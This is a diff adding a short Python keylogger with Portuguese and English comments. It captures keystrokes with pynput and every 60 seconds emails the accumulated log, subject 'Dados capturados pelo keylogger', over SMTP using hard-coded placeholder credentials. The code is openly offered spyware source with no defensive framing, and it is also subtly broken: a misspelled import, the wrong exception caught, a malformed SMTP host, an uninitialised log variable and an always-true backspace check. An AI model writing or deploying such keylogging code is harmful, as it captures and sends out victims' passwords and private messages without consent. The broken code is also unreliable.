@@ -1,0 +1,54 @@
+from pynput import keyboard
+import smtplib
+from email.mime.text import MIMETtext
+from threading import Timer
+
+#CONFIGURAÇÕES DE E-MAIL
+#EMAIL SETTINGS
+
+EMAIL_ORIGEM = "exemplo@gmail.com"
+EMAIL_DESTINO ="exemplo@gmail.com"
+SENHA_EMAIL = "Password@123"
+
+def enviar_email():
+    global log
+    if log:
+        msg = MIMETtext(log)
+        msg['SUBJECT'] = "Dados capturados pelo keylogger"
+        msg['From'] = EMAIL_ORIGEM
+        msg['To'] = EMAIL_DESTINO
+        try:
+            server = smtplib.SMTP("exemplo@gmail.com, 587")
+            server.starttls()
+            server.login(EMAIL_DESTINO, SENHA_EMAIL)
+            server.send_message(msg)
+            server.quit()
+        except Exception as e:
+            print("Erro ao enviar" , e)
+    
+    log = ""
+
+    #Agendar o envio a cada 60 segundos
+    #Schedulle the sending every 60 seconds
+    Timer(60, enviar_email).start()
+
+def on_press(key):
+    global log
+    try:
+        log+= key.char
+    except ArithmeticError:
+        if key == keyboard.Key.space:
+            log +=" "
+        elif key == keyboard.Key.enter:
+            log += "\n"
+        elif keyboard.Key.backspace:
+            log+="[<]"
+        else:
+            pass #ignorar control, shift, etc 
+
+#Inicia o keylogger e o envio automático
+#Starts the keylogger and the automatic sending
+
+with keyboard.Listener(on_press=on_press) as listener:
+    enviar_email()
+    listener.join()
